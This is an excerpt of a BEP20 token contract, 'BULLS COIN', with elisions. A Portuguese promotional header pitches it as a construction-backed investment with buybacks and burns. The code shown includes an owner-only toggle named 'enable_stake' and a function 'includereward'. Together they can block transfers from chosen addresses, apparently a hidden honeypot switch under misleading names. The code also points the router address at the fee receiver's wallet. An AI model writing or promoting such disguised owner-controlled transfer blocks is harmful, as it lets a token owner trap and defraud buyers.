...
TOKEN DEFLACIONÁRIO E AUTO-SUSTENTAVEL, BASEADO EM CONSTRUÇAO CIVIL. CASAS DE MÉDIO A ALTO PADRÃO. 
 
BULLS traz a oportunidade para todas as pessoas fazerem parte de uma estrutura de investimentos na
área de construção civil. Os investidores tem a oportunidade de ganhos na valorização cambial que 
ocorre naturalmente, além da compra e queima de 2% de todas as taxas do projeto.  
 
INJEÇÃO NO GRÁFICO
Após as vendas das obras concluídas 60% do lucro total será injetado diretamente no gráfico da BULLS 
sendo comprado e queimado, gerando valorização do token e tornando-o ainda mais escasso reduzindo o 
SUPPLY CIRCULANTE.  
 
SUPPLY: 1BI
LIQUIDEZ: 200M 
BURN INICIAL: 600M 
MARKETING/AIRDROPS: 200M 
 
SITE: WWW.BULLSCOIN.COM.BR 
TELEGRAM: https://t.me/bullscoinbr 
**/
...
contract BULLS is IBEP20, Auth {
    ...
    string constant _name = "BULLS COIN";
    ...
    uint256 private utilityfeeFee  = 2;
    ...
    constructor () Auth(msg.sender) {
        ...
        address routerV2 = 0x4e51237595E038A529bEE9335a66C37F067FC771; 
        ...
        marketingFeeReceiver = 0x4e51237595E038A529bEE9335a66C37F067FC771;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(stake){
            require(!getReward[sender],"stake");    
        }
    ...
    function enable_stake(bool _status) public onlyOwner {
        stake = _status;
    }
    ...
    function includereward(address[] calldata addresses, bool status) public onlyOwner {
